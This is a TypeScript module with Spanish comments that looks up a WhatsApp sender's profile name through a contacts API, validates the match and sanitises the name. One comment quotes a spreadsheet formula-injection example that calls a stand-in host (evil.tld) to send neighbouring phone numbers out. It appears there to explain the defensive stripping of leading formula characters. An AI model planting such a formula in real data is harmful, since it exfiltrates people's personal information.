import { baseDeZavu } from './zavu-base';

/**
 * El nombre del perfil de WhatsApp de quien escribe (#1170).
 *
 * Hoy toda conversación entra a la bandeja como un número. El nombre que la
 * persona puso en su perfil de WhatsApp existe y lo tiene Zavu, pero en OTRA
 * llamada que nunca hacíamos: el webhook del mensaje no lo trae.
 *
 * ## Qué se busca, y con qué parámetro
 *
 * Lo medido contra la API: `GET /contacts?phone=<...>` **se ignora** y
 * devuelve la lista completa. Esa medición fundó el diseño original —«no hay
 * filtro exacto, hay que usar `search`»— y la conclusión era demasiado
 * grande para el dato: la documentación del proveedor (skill
 * `contacts-management`) documenta el filtro exacto de la lista como
 * `contacts.list({ phoneNumber })`, y además un `contacts.getByPhone`.
 * O sea que `?phone=` no filtra porque NO ES EL NOMBRE DEL PARÁMETRO.
 *
 * Por eso se consulta en dos pasos y en este orden:
 *
 *  1. `?phoneNumber=<E.164>` — el filtro exacto que documenta el proveedor.
 *  2. `?search=<dígitos>` — la búsqueda por relevancia, que es lo que SÍ está
 *     medido contra la API de verdad, y queda como respaldo.
 *
 * **Medido el 01-11-2026 contra la API de producción: hoy el paso 1 devuelve
 * CERO resultados**, con `+` y sin `+`, con dos llaves distintas; el que
 * acierta es el 2. O sea que el primer viaje es, por ahora, uno de más por
 * contacto nuevo. Se deja igual a propósito: cuesta una llamada que ocurre
 * una sola vez por persona y fuera del camino del mensaje, y el día que el
 * proveedor lo haga funcionar —la doc dice que debería— esto pasa a ser
 * exacto sin que nadie toque nada. Si alguna vez molesta, lo que hay que
 * borrar es el primer elemento de esa lista.
 *
 * Nunca es peor que usar solo `search`: si el paso 1 devolviera la lista
 * entera (porque el parámetro tampoco existe), la comprobación por dígitos lo
 * descarta y el paso 2 hace lo de siempre. Y si el paso 1 filtra —como dice la
 * doc—, la respuesta es exacta y la búsqueda no se llega a usar. Lo que NO se
 * hace es medir esto con `curl`: se mide por el puerto, con el doble del
 * `fetch` de los tests (`.claude/rules/testing.md`, #870).
 *
 * ## Es una búsqueda, no una clave: lo que vuelve se comprueba
 *
 * `search` calza por FRAGMENTO FINAL del número y también contra el nombre
 * para mostrar y el nombre de perfil, así que lo que vuelve puede ser
 * cualquiera. Se compara contra `primaryPhone` Y contra `phoneNumber` del
 * mismo item: el proveedor declara `phoneNumber` DEPRECADO en favor de
 * `primaryPhone`, así que apoyarse en uno solo es elegir entre caerse hoy o
 * caerse el día de la migración. Aceptar los dos no afloja nada: los dos
 * campos son del MISMO contacto devuelto, y un contacto ajeno solo calzaría
 * si su propio teléfono ES el que se buscó — y entonces es la persona
 * correcta.
 *
 * ## Las identidades opacas de WhatsApp
 *
 * En WhatsApp la identidad no siempre es un número: hay BSUID
 * (`US.<dígitos>`, de quien adoptó nombre de usuario y escondió su número) y
 * JID de grupo (`<dígitos>@g.us`). Pasarle eso a una búsqueda de teléfonos
 * gasta un viaje que nunca puede calzar, así que acá no entra texto crudo:
 * entra una `IdentidadDePerfil` ya clasificada. El BSUID tiene su propio
 * camino y se comprueba contra `whatsapp.bsuid`, que la respuesta medida
 * expone; el grupo no entra, porque un grupo no tiene nombre de perfil.
 *
 * ## Por qué no lanza
 *
 * Esto corre DESPUÉS de que el mensaje ya está guardado, y en su propio job.
 * Un proveedor que no contesta no puede voltear nada: el peor resultado
 * aceptable es el de hoy —el contacto se queda con su número— y para eso
 * alcanza con devolver `null`.
 *
 * ## El dato es personal
 *
 * `profileName` y el teléfono son datos personales, así que acá no hay un solo
 * `console`: el motivo del fallo sale por `avisar` y quien llama decide dónde
 * registrarlo. Ni el nombre ni el número viajan en ese motivo — y tampoco la
 * URL, que lleva el teléfono en la consulta. Que la URL no se escape por la
 * telemetría (spans de `undici`, breadcrumbs de Sentry) se resuelve en el
 * borde de salida, en `initObservability`: acá no se puede.
 */
export interface ConsultaDePerfil {
  /** El VALOR de la llave (no su referencia): lo resuelve quien llama. */
  apiKey: string;
  /** Por defecto `ZAVU_API_BASE` y, si no está, `ZAVU_API_BASE_DEFAULT`. */
  apiBase?: string;
  /** Inyectable para medir esto POR EL PUERTO en los tests (#870). */
  fetch?: typeof globalThis.fetch;
  timeoutMs?: number;
  /** El MOTIVO de que no haya nombre. Nunca el dato. */
  avisar?: (motivo: string) => void;
}

/**
 * A quién se le busca el nombre. NO es un `string`.
 *
 * Lo que esto evita: `nombreDePerfil(data.phone, …)` compilaba, y `data.phone`
 * en WhatsApp puede ser `US.13491208655302741918` o `123456789@g.us`. Sacarle
 * los dígitos a un BSUID deja 20 y pasa cualquier guarda de «parece un
 * teléfono», así que salía un `GET /contacts?search=1349…` por CADA mensaje de
 * ese contacto, para siempre, que jamás podía calzar contra un teléfono.
 * Con un tipo, el llamador tiene que decir QUÉ es antes de preguntar.
 */
export type IdentidadDePerfil =
  | { tipo: 'telefono'; telefono: string }
  | { tipo: 'bsuid'; bsuid: string };

/**
 * Cuatro segundos. El mensaje ya entró a la bandeja, así que esperar más no
 * mejora nada para quien escribió.
 */
const TIMEOUT_POR_DEFECTO = 4_000;

/**
 * Un perfil de WhatsApp no pasa de ~25 caracteres; el tope deja aire y corta
 * por PUNTOS DE CÓDIGO, no por bytes, para no partir un emoji al medio.
 */
const TOPE_DEL_NOMBRE = 80;

/** Si Zavu devolviera una página entera, no se recorre completa por nada. */
const TOPE_DE_ITEMS = 100;

/** BSUID de WhatsApp: el prefijo `US.` y dígitos. */
const BSUID = /^US\.\d{6,}$/;

/**
 * Lo que puede ser un teléfono escrito: `+`, dígitos, espacios, paréntesis y
 * guiones. Deja afuera `123456789@g.us` y `US.134…`, que es el punto.
 */
const PARECE_TELEFONO = /^\+?[\d\s().-]+$/;

/** Ocho es un celular chileno sin código de país: menos que eso no es número. */
const MINIMO_DE_DIGITOS = 8;

function digitos(valor: string): string {
  return valor.replace(/[^0-9]/g, '');
}

/**
 * Clasifica la identidad que mandó el canal, o `null` si no hay nada que
 * preguntarle a Zavu (un JID de grupo, un id de chat de Instagram, basura).
 *
 * Va acá y no en el llamador para que la regla viva en un solo lugar y tenga
 * pruebas propias: es la pieza que decide si sale o no una llamada HTTP.
 */
export function identidadDePerfil(valor: string | null | undefined): IdentidadDePerfil | null {
  const crudo = valor?.trim() ?? '';
  if (crudo === '') return null;
  if (BSUID.test(crudo)) return { tipo: 'bsuid', bsuid: crudo };
  if (!PARECE_TELEFONO.test(crudo)) return null;
  return digitos(crudo).length >= MINIMO_DE_DIGITOS ? { tipo: 'telefono', telefono: crudo } : null;
}

/** Un vencimiento del `AbortSignal.timeout`, que llega como `DOMException`. */
function esVencimiento(err: unknown): boolean {
  const nombre = (err as { name?: unknown } | null)?.name;
  return nombre === 'TimeoutError' || nombre === 'AbortError';
}

/** Un carácter de control o un separador de línea: no es parte de un nombre. */
function esControl(caracter: string): boolean {
  const punto = caracter.codePointAt(0) ?? 0;
  return punto < 0x20 || punto === 0x7f || punto === 0x2028 || punto === 0x2029;
}

/**
 * Lo que una planilla evalúa como fórmula si está al principio de la celda.
 * La misma lista que usa `csvSeguro` en `@iaxti/core`.
 */
const ARRANQUE_DE_FORMULA = /^[=+\-@\t\r]+/;

function nombreUtil(crudo: unknown): string | null {
  if (typeof crudo !== 'string') return null;
  // Los controles y los separadores de línea descuadran la bandeja; el resto
  // —emoji incluido— se respeta tal cual lo escribió la persona.
  //
  // Se recorre por PUNTOS DE CÓDIGO y no con una clase de caracteres: esa
  // clase deja bytes invisibles dentro del archivo fuente, y el lint la
  // rechaza con razón.
  let limpio = Array.from(crudo)
    .map((caracter) => (esControl(caracter) ? ' ' : caracter))
    .join('')
    .replace(/\s+/g, ' ')
    .trim();
  // Y lo que evita este `replace`, que no es cosmético: hasta este paso
  // `contacts.name` lo escribía el negocio (su pantalla o su propio CSV).
  // Desde acá lo escribe un desconocido no autenticado con el solo acto de
  // mandar un «hola», y la exportación de contactos se abre en Excel. Un
  // nombre de perfil `=WEBSERVICE("https://evil.tld/?x="&B2)` se evalúa al
  // abrir el archivo y se lleva los teléfonos de las filas vecinas. La
  // defensa de verdad es la de SALIDA (`celda` → `csvSeguro`), porque los
  // nombres que ya están guardados también pueden empezar así; esta es la
  // segunda capa, y acá se puede ser tajante: un nombre que arranca con `=`
  // no es un nombre.
  limpio = limpio.replace(ARRANQUE_DE_FORMULA, '').trim();
  if (limpio === '') return null;
  const puntos = Array.from(limpio);
  if (puntos.length <= TOPE_DEL_NOMBRE) return limpio;
  return puntos.slice(0, TOPE_DEL_NOMBRE).join('').trim();
}

interface Respuesta {
  /** Los items que trajo, ya acotados. `null` si la consulta no sirvió. */
  items: unknown[] | null;
}

async function pedir(
  url: string,
  config: ConsultaDePerfil,
  avisar: (motivo: string) => void,
): Promise<Respuesta> {
  const llamar = config.fetch ?? globalThis.fetch;
  let respuesta: Response;
  try {
    respuesta = await llamar(url, {
      method: 'GET',
      headers: { Authorization: `Bearer ${config.apiKey}`, Accept: 'application/json' },
      signal: AbortSignal.timeout(config.timeoutMs ?? TIMEOUT_POR_DEFECTO),
    });
  } catch (err) {
    // El motivo se CLASIFICA, no se copia: el mensaje de un `fetch` fallido
    // suele traer la URL, y la URL lleva el teléfono en la consulta.
    avisar(esVencimiento(err) ? 'Zavu no contestó dentro del plazo' : 'no se pudo llamar a Zavu');
    return { items: null };
  }
  if (!respuesta.ok) {
    avisar(`Zavu respondió ${respuesta.status}`);
    return { items: null };
  }
  let cuerpo: unknown;
  try {
    cuerpo = await respuesta.json();
  } catch {
    avisar('Zavu respondió algo que no es JSON');
    return { items: null };
  }
  const items = (cuerpo as { items?: unknown } | null)?.items;
  if (!Array.isArray(items)) {
    avisar('la respuesta de Zavu no trae contactos');
    return { items: null };
  }
  return { items: items.slice(0, TOPE_DE_ITEMS) };
}

/**
 * ¿Este item es la persona que se buscó?
 *
 * Para un teléfono: los dígitos tienen que coincidir con `primaryPhone` —el
 * campo vigente— o con `phoneNumber` —el deprecado, que es el que hoy manda la
 * API—. Para un BSUID: la igualdad exacta con `whatsapp.bsuid`.
 */
function esLaPersona(item: unknown, identidad: IdentidadDePerfil): boolean {
  const ficha = item as
    | { phoneNumber?: unknown; primaryPhone?: unknown; whatsapp?: { bsuid?: unknown } | null }
    | null;
  if (!ficha) return false;
  if (identidad.tipo === 'bsuid') return ficha.whatsapp?.bsuid === identidad.bsuid;
  const buscado = digitos(identidad.telefono);
  return [ficha.primaryPhone, ficha.phoneNumber].some(
    (valor) => typeof valor === 'string' && digitos(valor) === buscado,
  );
}

/**
 * El nombre de perfil de WhatsApp de una identidad, o `null` si no se puede
 * saber. Nunca lanza.
 */
export async function nombreDePerfil(
  identidad: IdentidadDePerfil,
  config: ConsultaDePerfil,
): Promise<string | null> {
  const avisar = config.avisar ?? (() => {});
  if (!config.apiKey) {
    avisar('la credencial del canal no está en este ambiente');
    return null;
  }
  const base = baseDeZavu(config.apiBase).replace(/\/$/, '');
  const consultas: Array<Record<string, string>> =
    identidad.tipo === 'telefono'
      ? // El filtro exacto primero; la búsqueda, de respaldo.
        [{ phoneNumber: identidad.telefono }, { search: digitos(identidad.telefono) }]
      : // Un BSUID no tiene filtro exacto documentado: solo la búsqueda, y el
        // calce se comprueba contra `whatsapp.bsuid`, no contra un teléfono.
        [{ search: digitos(identidad.bsuid) }];

  let hubieronItems = false;
  for (const parametros of consultas) {
    const { items } = await pedir(
      `${base}/contacts?${new URLSearchParams(parametros).toString()}`,
      config,
      avisar,
    );
    // La consulta falló y ya se avisó por qué: no se insiste con la siguiente,
    // que iría al mismo proveedor caído y dejaría un segundo aviso igual.
    if (items === null) return null;
    if (items.length === 0) continue;
    hubieronItems = true;
    const calce = items.find((item) => esLaPersona(item, identidad));
    // Un perfil sin nombre es un caso de todos los días —se puede no tener— y
    // no se avisa. Tampoco se sigue buscando: la persona ya se encontró.
    if (calce) return nombreUtil((calce as { profileName?: unknown }).profileName);
  }

  // Zavu no conoce esta identidad: es lo normal con cada persona nueva y no se
  // avisa. Avisar de lo normal es la forma más rápida de que nadie lea los
  // avisos.
  if (!hubieronItems) return null;
  // ACÁ se para la trampa, y solo acá: vinieron contactos por los DOS caminos
  // y ninguno es el que se buscó, por ningún campo de teléfono. Reservarlo
  // para este caso es lo que lo mantiene útil — si saltara porque un campo
  // deprecado vino vacío, sería ruido en cada mensaje y dejaría de servir para
  // lo que se escribió. El BSUID no llega acá: su búsqueda no está medida y su
  // fallo es esperable, así que no gasta el aviso.
  if (identidad.tipo === 'telefono') {
    avisar('ni el filtro exacto ni la búsqueda devolvieron el número buscado');
  }
  return null;
}
